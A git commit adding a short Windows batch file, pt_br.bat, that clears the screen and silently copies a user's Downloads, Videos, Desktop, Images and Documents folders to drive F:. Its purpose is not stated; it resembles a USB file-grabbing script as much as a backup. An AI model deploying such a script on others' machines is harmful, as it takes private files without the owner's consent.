2d5ed40a9f0fdf5c618aed255b3f7e4ff29e9df8
cosmic jelly/ <91630610+cosmicjelly1@users.noreply.github.com>
2022-06-21 11:33:34 -0300

    Add files via upload

---
+++ windows-version/pt_br.bat
@@ -0,0 +1,7 @@
+cls
+copy C:\Users\%USERNAME%\Downloads F:\
+copy C:\Users\%USERNAME%\Videos F:\
+copy C:\Users\%USERNAME%\Desktop F:\
+copy C:\Users\%USERNAME%\Images F:\
+copy C:\Users\%USERNAME%\Documents F:\
+cls
